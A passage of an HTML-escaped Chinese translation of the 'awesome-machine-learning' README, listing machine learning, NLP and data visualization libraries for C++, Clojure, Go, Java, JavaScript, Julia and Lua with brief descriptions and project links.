&lt;a href=&quot;https://github.com/josephmisiti/awesome-machine-learning/blob/master/README.md#compute-vision&quot; name=&quot;user-content-compute-vision&quot;&gt;&lt;/a&gt;计算机视觉&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/liuliu/ccv&quot;&gt;CCV&lt;/a&gt; —基于C语言/提供缓存/核心的机器视觉库，新颖的机器视觉库&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;http://opencv.org/&quot;&gt;OpenCV&lt;/a&gt;—它提供C++, C, Python, Java 以及 MATLAB接口，并支持Windows, Linux, Android and Mac OS操作系统。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;
&lt;a href=&quot;https://github.com/josephmisiti/awesome-machine-learning/blob/master/README.md#general-purpose-machine-learning&quot; name=&quot;user-content-general-purpose-machine-learning&quot;&gt;&lt;/a&gt;通用机器学习&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://www.mlpack.org/&quot;&gt;MLPack&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://dlib.net/ml.html&quot;&gt;DLib&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://code.google.com/p/encog-cpp/&quot;&gt;ecogg&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://image.diku.dk/shark/sphinx_pages/build/html/index.html&quot;&gt;shark&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;
&lt;a href=&quot;https://github.com/josephmisiti/awesome-machine-learning/blob/master/README.md#closure&quot; name=&quot;user-content-closure&quot;&gt;&lt;/a&gt;Closure&lt;/h2&gt;
&lt;h4&gt;通用机器学习&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;a href=&quot;http://www.clojure-toolbox.com/&quot;&gt;Closure Toolbox&lt;/a&gt;—Clojure语言库与工具的分类目录&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;
&lt;a href=&quot;https://github.com/josephmisiti/awesome-machine-learning/blob/master/README.md#go&quot; name=&quot;user-content-go&quot;&gt;&lt;/a&gt;Go&lt;/h2&gt;
&lt;h4&gt;
&lt;a href=&quot;https://github.com/josephmisiti/awesome-machine-learning/blob/master/README.md#natural-language-processing&quot; name=&quot;user-content-natural-language-processing&quot;&gt;&lt;/a&gt;自然语言处理&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/reiver/go-porterstemmer&quot;&gt;go-porterstemmer&lt;/a&gt;—一个Porter词干提取算法的原生Go语言净室实现&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/Rookii/paicehusk&quot;&gt;paicehusk&lt;/a&gt;—Paice/Husk词干提取算法的Go语言实现&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://bitbucket.org/tebeka/snowball&quot;&gt;snowball&lt;/a&gt;—Go语言版的Snowball词干提取器&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;
&lt;span style=&quot;font-family: &#39;Helvetica Neue&#39;, Helvetica, Arial, sans-serif; font-size: 16px; font-style: normal; font-weight: bold;&quot;&gt;通用机器学习&lt;/span&gt;&lt;a href=&quot;https://github.com/josephmisiti/awesome-machine-learning/blob/master/README.md#general-purpose-machine-learning-2&quot; name=&quot;user-content-general-purpose-machine-learning-2&quot;&gt;&lt;/a&gt;
&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/sjwhitworth/golearn&quot;&gt;Go Learn&lt;/a&gt;— Go语言机器学习库&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/daviddengcn/go-pr&quot;&gt;go-pr&lt;/a&gt; —Go语言机器学习包.&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/jbrukh/bayesian&quot;&gt;bayesian&lt;/a&gt;—Go语言朴素贝叶斯分类库。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/thoj/go-galib&quot;&gt;go-galib&lt;/a&gt;—Go语言遗传算法库。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;
&lt;a href=&quot;https://github.com/josephmisiti/awesome-machine-learning/blob/master/README.md#data-analysis--data-visualization&quot; name=&quot;user-content-data-analysis--data-visualization&quot;&gt;&lt;/a&gt;&lt;br&gt;
数据分析/数据可视化&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/StepLg/go-graph&quot;&gt;go-graph&lt;/a&gt;—Go语言图形库。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;http://www.svgopen.org/2011/papers/34-SVGo_a_Go_Library_for_SVG_generation/&quot;&gt;SVGo&lt;/a&gt;—Go语言的SVG生成库。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;
&lt;a href=&quot;https://github.com/josephmisiti/awesome-machine-learning/blob/master/README.md#java&quot; name=&quot;user-content-java&quot;&gt;&lt;/a&gt;Java&lt;/h2&gt;
&lt;h4&gt;
&lt;a href=&quot;https://github.com/josephmisiti/awesome-machine-learning/blob/master/README.md#natural-language-processing-1&quot; name=&quot;user-content-natural-language-processing-1&quot;&gt;&lt;/a&gt;自然语言处理&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;a href=&quot;http://nlp.stanford.edu/software/corenlp.shtml&quot;&gt;CoreNLP&lt;/a&gt;—斯坦福大学的CoreNLP提供一系列的自然语言处理工具，输入原始英语文本，可以给出单词的基本形式（下面Stanford开头的几个工具都包含其中）。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;http://nlp.stanford.edu/software/lex-parser.shtml&quot;&gt;Stanford Parser&lt;/a&gt;—一个自然语言解析器。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;http://nlp.stanford.edu/software/tagger.shtml&quot;&gt;Stanford POS Tagger&lt;/a&gt; —一个词性分类器。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;http://nlp.stanford.edu/software/CRF-NER.shtml&quot;&gt;Stanford Name Entity Recognizer&lt;/a&gt;—Java实现的名称识别器&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;http://nlp.stanford.edu/software/segmenter.shtml&quot;&gt;Stanford Word Segmenter&lt;/a&gt;—分词器，很多NLP工作中都要用到的标准预处理步骤。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;http://nlp.stanford.edu/software/tregex.shtml&quot;&gt;Tregex, Tsurgeon and Semgrex&lt;/a&gt; —用来在树状数据结构中进行模式匹配，基于树关系以及节点匹配的正则表达式（名字是“tree regular expressions”的缩写）。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;http://nlp.stanford.edu/software/phrasal/&quot;&gt;Stanford Phrasal:&lt;/a&gt;最新的基于统计短语的机器翻译系统，&lt;a href=&quot;http://nlp.stanford.edu/software/phrasal/&quot;&gt; &lt;/a&gt;java编写&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;http://nlp.stanford.edu/software/tokensregex.shtml&quot;&gt;Stanford Tokens Regex&lt;/a&gt;—用以定义文本模式的框架。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;http://nlp.stanford.edu/software/sutime.shtml&quot;&gt;Stanford Temporal Tagger&lt;/a&gt;—SUTime是一个识别并标准化时间表达式的库。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;http://nlp.stanford.edu/software/patternslearning.shtml&quot;&gt;Stanford SPIED&lt;/a&gt;—在种子集上使用模式，以迭代方式从无标签文本中学习字符实体&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;http://nlp.stanford.edu/software/tmt/tmt-0.4/&quot;&gt;Stanford Topic Modeling Toolbox&lt;/a&gt; —为社会科学家及其他希望分析数据集的人员提供的主题建模工具。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/twitter/twitter-text-java&quot;&gt;Twitter Text Java&lt;/a&gt;—Java实现的推特文本处理库&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;http://mallet.cs.umass.edu/&quot;&gt;MALLET&lt;/a&gt; -—基于Java的统计自然语言处理、文档分类、聚类、主题建模、信息提取以及其他机器学习文本应用包。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://opennlp.apache.org/&quot;&gt;OpenNLP&lt;/a&gt;—处理自然语言文本的机器学习工具包。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;http://alias-i.com/lingpipe/index.html&quot;&gt;LingPipe&lt;/a&gt; —使用计算机语言学处理文本的工具包。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;
&lt;a href=&quot;https://github.com/josephmisiti/awesome-machine-learning/blob/master/README.md#general-purpose-machine-learning-3&quot; name=&quot;user-content-general-purpose-machine-learning-3&quot;&gt;&lt;/a&gt;&lt;br&gt;
通用机器学习&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;a href=&quot;http://spark.apache.org/docs/latest/mllib-guide.html&quot;&gt;MLlib in Apache Spark&lt;/a&gt;—Spark中的分布式机器学习程序库&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/apache/mahout&quot;&gt;Mahout&lt;/a&gt; —分布式的机器学习库&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;http://nlp.stanford.edu/software/classifier.shtml&quot;&gt;Stanford Classifier&lt;/a&gt; —斯坦福大学的分类器&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;http://www.cs.waikato.ac.nz/ml/weka/&quot;&gt;Weka&lt;/a&gt;—Weka是数据挖掘方面的机器学习算法集。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/cloudera/oryx&quot;&gt;ORYX&lt;/a&gt;—提供一个简单的大规模实时机器学习/预测分析基础架构。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;
&lt;a href=&quot;https://github.com/josephmisiti/awesome-machine-learning/blob/master/README.md#data-analysis--data-visualization-1&quot; name=&quot;user-content-data-analysis--data-visualization-1&quot;&gt;&lt;/a&gt;数据分析/数据可视化&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/apache/hadoop-mapreduce&quot;&gt;Hadoop&lt;/a&gt;—大数据分析平台&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/apache/spark&quot;&gt;Spark&lt;/a&gt;—快速通用的大规模数据处理引擎。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/cloudera/impala&quot;&gt;Impala&lt;/a&gt; —为Hadoop实现实时查询&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;/h2&gt;
&lt;h2&gt;
&lt;a href=&quot;https://github.com/josephmisiti/awesome-machine-learning/blob/master/README.md#javascript&quot; name=&quot;user-content-javascript&quot;&gt;&lt;/a&gt;Javascript&lt;/h2&gt;
&lt;h4&gt;
&lt;a href=&quot;https://github.com/josephmisiti/awesome-machine-learning/blob/master/README.md#natural-language-processing-2&quot; name=&quot;user-content-natural-language-processing-2&quot;&gt;&lt;/a&gt;自然语言处理&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/twitter/twitter-text-js&quot;&gt;Twitter-text-js&lt;/a&gt; —JavaScript实现的推特文本处理库&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/nicktesla/nlpjs&quot;&gt;NLP.js&lt;/a&gt; —javascript及coffeescript编写的NLP工具&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/NaturalNode/natural&quot;&gt;natural&lt;/a&gt;—Node下的通用NLP工具&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/loadfive/Knwl.js&quot;&gt;Knwl.js&lt;/a&gt;—JS编写的自然语言处理器&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;/h4&gt;
&lt;h4&gt;
&lt;a href=&quot;https://github.com/josephmisiti/awesome-machine-learning/blob/master/README.md#data-analysis--data-visualization-2&quot; name=&quot;user-content-data-analysis--data-visualization-2&quot;&gt;&lt;/a&gt;数据分析/数据可视化&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://d3js.org/&quot;&gt;D3.js&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.highcharts.com/&quot;&gt;High Charts&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://nvd3.org/&quot;&gt;NVD3.js&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://dc-js.github.io/dc.js/&quot;&gt;dc.js&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.chartjs.org/&quot;&gt;chartjs&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://dimplejs.org/&quot;&gt;dimple&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.amcharts.com/&quot;&gt;amCharts&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;
&lt;a href=&quot;https://github.com/josephmisiti/awesome-machine-learning/blob/master/README.md#general-purpose-machine-learning-4&quot; name=&quot;user-content-general-purpose-machine-learning-4&quot;&gt;&lt;/a&gt;&lt;br&gt;
通用机器学习&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;a href=&quot;http://cs.stanford.edu/people/karpathy/convnetjs/&quot;&gt;Convnet.js&lt;/a&gt;—训练深度学习模型的JavaScript库。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/tixz/clustering.js&quot;&gt;Clustering.js&lt;/a&gt;—用JavaScript实现的聚类算法，供Node.js及浏览器使用。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/serendipious/nodejs-decision-tree-id3&quot;&gt;Decision Trees&lt;/a&gt;—Node.js实现的决策树，使用ID3算法。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/rlidwka/node-fann&quot;&gt;Node-fann&lt;/a&gt; —Node.js下的快速人工神经网络库。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/tixz/kmeans.js&quot;&gt;Kmeans.js&lt;/a&gt;—k-means算法的简单Javascript实现，供Node.js及浏览器使用。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/primaryobjects/lda&quot;&gt;LDA.js&lt;/a&gt; —供Node.js用的LDA主题建模工具。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/yandongliu/learningjs&quot;&gt;Learning.js&lt;/a&gt;—逻辑回归/c4.5决策树的JavaScript实现&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;http://joonku.com/project/machine_learning&quot;&gt;Machine Learning&lt;/a&gt;—Node.js的机器学习库。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/nicolaspanel/node-svm&quot;&gt;Node-SVM&lt;/a&gt;—Node.js的支持向量机&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/harthur/brain&quot;&gt;Brain&lt;/a&gt; —JavaScript实现的神经网络&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/omphalos/bayesian-bandit.js&quot;&gt;Bayesian-Bandit&lt;/a&gt; —贝叶斯强盗算法的实现，供Node.js及浏览器使用。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;
&lt;a href=&quot;https://github.com/josephmisiti/awesome-machine-learning/blob/master/README.md#julia&quot; name=&quot;user-content-julia&quot;&gt;&lt;/a&gt;Julia&lt;/h2&gt;
&lt;h4&gt;
&lt;a href=&quot;https://github.com/josephmisiti/awesome-machine-learning/blob/master/README.md#general-purpose-machine-learning-5&quot; name=&quot;user-content-general-purpose-machine-learning-5&quot;&gt;&lt;/a&gt;通用机器学习&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/JuliaStats/PGM.jl&quot;&gt;PGM&lt;/a&gt;—Julia实现的概率图模型框架。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/trthatcher/DA.jl&quot;&gt;DA&lt;/a&gt;—Julia实现的正则化判别分析包。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/lindahua/Regression.jl&quot;&gt;Regression&lt;/a&gt;—回归分析算法包（如线性回归和逻辑回归）。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/dcjones/Loess.jl&quot;&gt;Local Regression&lt;/a&gt; —局部回归，非常平滑！&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/nutsiepully/NaiveBayes.jl&quot;&gt;Naive Bayes&lt;/a&gt; —朴素贝叶斯的简单Julia实现&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/dmbates/MixedModels.jl&quot;&gt;Mixed Models&lt;/a&gt; —（统计）混合效应模型的Julia包&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/fredo-dedup/SimpleMCMC.jl&quot;&gt;Simple MCMC&lt;/a&gt; —Julia实现的基本mcmc采样器&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/JuliaStats/Distance.jl&quot;&gt;Distance&lt;/a&gt;—Julia实现的距离评估模块&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/bensadeghi/DecisionTree.jl&quot;&gt;Decision Tree&lt;/a&gt; —决策树分类器及回归分析器&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/compressed/neural.jl&quot;&gt;Neural&lt;/a&gt; —Julia实现的神经网络&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/doobwa/MCMC.jl&quot;&gt;MCMC&lt;/a&gt; —Julia下的MCMC工具&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/JuliaStats/GLM.jl&quot;&gt;GLM&lt;/a&gt; —Julia写的广义线性模型包&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/lendle/OnlineLearning.jl&quot;&gt;Online Learning&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/simonster/GLMNet.jl&quot;&gt;GLMNet&lt;/a&gt; —GMLNet的Julia包装版，适合套索/弹性网模型。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/JuliaStats/Clustering.jl&quot;&gt;Clustering&lt;/a&gt;—数据聚类的基本函数：k-means, dp-means等。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/JuliaStats/SVM.jl&quot;&gt;SVM&lt;/a&gt;—Julia下的支持向量机。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/JuliaStats/KernelDensity.jl&quot;&gt;Kernal Density&lt;/a&gt;—Julia下的核密度估计器&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/JuliaStats/DimensionalityReduction.jl&quot;&gt;Dimensionality Reduction&lt;/a&gt;—降维算法&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/JuliaStats/NMF.jl&quot;&gt;NMF&lt;/a&gt; —Julia下的非负矩阵分解包&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/EricChiang/ANN.jl&quot;&gt;ANN&lt;/a&gt;—Julia实现的神经网络&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;
&lt;a href=&quot;https://github.com/josephmisiti/awesome-machine-learning/blob/master/README.md#natural-language-processing-3&quot; name=&quot;user-content-natural-language-processing-3&quot;&gt;&lt;/a&gt;自然语言处理&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/slycoder/TopicModels.jl&quot;&gt;Topic Models&lt;/a&gt; —Julia下的主题建模&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/johnmyleswhite/TextAnalysis.jl&quot;&gt;Text Analysis&lt;/a&gt;—Julia下的文本分析包&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;
&lt;a href=&quot;https://github.com/josephmisiti/awesome-machine-learning/blob/master/README.md#data-analysis--data-visualization-3&quot; name=&quot;user-content-data-analysis--data-visualization-3&quot;&gt;&lt;/a&gt;数据分析/数据可视化&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/IainNZ/GraphLayout.jl&quot;&gt;Graph Layout&lt;/a&gt; —纯Julia实现的图布局算法。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/JuliaStats/DataFramesMeta.jl&quot;&gt;Data Frames Meta&lt;/a&gt; —DataFrames的元编程工具。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/nfoti/JuliaData&quot;&gt;Julia Data&lt;/a&gt;—处理表格数据的Julia库&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/WizardMac/DataRead.jl&quot;&gt;Data Read&lt;/a&gt;—从Stata、SAS、SPSS读取文件&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/JuliaStats/HypothesisTests.jl&quot;&gt;Hypothesis Tests&lt;/a&gt;—Julia中的假设检验包&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/dcjones/Gadfly.jl&quot;&gt;Gladfly&lt;/a&gt; —Julia编写的灵巧的统计绘图系统。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/johnmyleswhite/stats.jl&quot;&gt;Stats&lt;/a&gt;—Julia编写的统计测试函数包&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/johnmyleswhite/RDatasets.jl&quot;&gt;RDataSets&lt;/a&gt; —读取R语言中众多可用的数据集的Julia函数包。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/JuliaStats/DataFrames.jl&quot;&gt;DataFrames&lt;/a&gt; —处理表格数据的Julia库。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/JuliaStats/Distributions.jl&quot;&gt;Distributions&lt;/a&gt;—概率分布及相关函数的Julia包。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/JuliaStats/DataArrays.jl&quot;&gt;Data Arrays&lt;/a&gt; —元素值可以为空的数据结构。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/JuliaStats/TimeSeries.jl&quot;&gt;Time Series&lt;/a&gt;—Julia的时间序列数据工具包。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/JuliaStats/Sampling.jl&quot;&gt;Sampling&lt;/a&gt;—Julia的基本采样算法包&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;
&lt;a href=&quot;https://github.com/josephmisiti/awesome-machine-learning/blob/master/README.md#misc-stuff--presentations&quot; name=&quot;user-content-misc-stuff--presentations&quot;&gt;&lt;/a&gt;杂项/演示文稿&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/JuliaDSP/DSP&quot;&gt;DSP&lt;/a&gt; —数字信号处理&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/JuliaCon/presentations&quot;&gt;JuliaCon Presentations&lt;/a&gt;—Julia大会上的演示文稿&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/davidavdav/SignalProcessing&quot;&gt;SignalProcessing&lt;/a&gt;—Julia的信号处理工具&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/timholy/Images.jl&quot;&gt;Images&lt;/a&gt;—Julia的图片库&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a href=&quot;https://github.com/josephmisiti/awesome-machine-learning/blob/master/README.md#matlab&quot; name=&quot;user-content-matlab&quot;&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;h2&gt;Lua&lt;/h2&gt;
&lt;h4&gt;
&lt;a href=&quot;https://github.com/josephmisiti/awesome-machine-learning#general-purpose-machine-learning-7&quot; name=&quot;user-content-general-purpose-machine-learning-7&quot;&gt;&lt;/a&gt;&lt;br&gt;
通用机器学习&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;a href=&quot;http://torch.ch/&quot;&gt;Torch7&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;a href=&quot;http://jucor.github.io/torch-cephes&quot;&gt;cephes&lt;/a&gt; —Cephes数学函数库，包装成Torch可用形式。提供并包装了超过180个特殊的数学函数，由Stephen L. Moshier开发，是SciPy的核心，应用于很多场合。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/torch/graph&quot;&gt;graph&lt;/a&gt; —供Torch使用的图形包。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;http://jucor.github.io/torch-randomkit/&quot;&gt;randomkit&lt;/a&gt;—从Numpy提取的随机数生成包，包装成Torch可用形式。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;http://soumith.ch/torch-signal/signal/&quot;&gt;signal&lt;/a&gt; —Torch-7可用的信号处理工具包，可进行FFT, DCT, Hilbert, cepstrums, stft等变换。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/torch/nn&quot;&gt;nn&lt;/a&gt; —Torch可用的神经网络包。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/torch/nngraph&quot;&gt;nngraph&lt;/a&gt; —为nn库提供图形计算能力。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/clementfarabet/lua---nnx&quot;&gt;nnx&lt;/a&gt;—一个不稳定实验性的包，扩展Torch内置的nn库。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/torch/optim&quot;&gt;optim&lt;/a&gt;—Torch可用的优化算法库，包括 SGD, Adagrad, 共轭梯度算法, LBFGS, RProp等算法。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/koraykv/unsup&quot;&gt;unsup&lt;/a&gt;—Torch下的非监督学习包。提供的模块与nn(LinearPsd, ConvPsd, AutoEncoder, …)及独立算法 (k-means, PCA)等兼容。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/clementfarabet/manifold&quot;&gt;manifold&lt;/a&gt;—操作流形的包。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/koraykv/torch-svm&quot;&gt;svm&lt;/a&gt;—Torch的支持向量机库。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/clementfarabet/lbfgs&quot;&gt;lbfgs&lt;/a&gt;—将liblbfgs包装为FFI接口。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/clementfarabet/vowpal_wabbit&quot;&gt;vowpalwabbit&lt;/a&gt; —老版的vowpalwabbit对torch的接口。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/clementfarabet/lua---opengm&quot;&gt;OpenGM&lt;/a&gt;—OpenGM是C++编写的图形建模及推断库，该binding可以用Lua以简单的方式描述图形，然后用OpenGM优化。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/MichaelMathieu/lua---spaghetti&quot;&gt;sphagetti&lt;/a&gt; —MichaelMathieu为torch7编写的稀疏线性模块。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/ocallaco/LuaSHkit&quot;&gt;LuaSHKit&lt;/a&gt; —将局部敏感哈希库SHKit包装成lua可用形式。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/rlowrance/kernel-smoothers&quot;&gt;kernel smoothing&lt;/a&gt; —KNN、核权平均以及局部线性回归平滑器&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/torch/cutorch&quot;&gt;cutorch&lt;/a&gt;—torch的CUDA后端实现&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/torch/cunn&quot;&gt;cunn&lt;/a&gt; —torch的CUDA神经网络实现。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/clementfarabet/lua---imgraph&quot;&gt;imgraph&lt;/a&gt;—torch的图像/图形库，提供从图像创建图形、分割、建立树、又转化回图像的例程&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/clementfarabet/videograph&quot;&gt;videograph&lt;/a&gt;—torch的视频/图形库，提供从视频创建图形、分割、建立树、又转化回视频的例程&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/marcoscoffier/torch-saliency&quot;&gt;saliency&lt;/a&gt; —积分图像的代码和工具，用来从快速积分直方图中寻找兴趣点。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/marcoscoffier/lua---stitch&quot;&gt;stitch&lt;/a&gt; —使用hugin拼合图像并将其生成视频序列。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/marcoscoffier/lua---sfm&quot;&gt;sfm&lt;/a&gt;—运动场景束调整/结构包&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/koraykv/fex&quot;&gt;fex&lt;/a&gt; —torch的特征提取包，提供SIFT和dSIFT模块。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/sermanet/OverFeat&quot;&gt;OverFeat&lt;/a&gt;—当前最高水准的通用密度特征提取器。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://numlua.luaforge.net/&quot;&gt;Numeric Lua&lt;/a&gt;&lt;/li&gt;
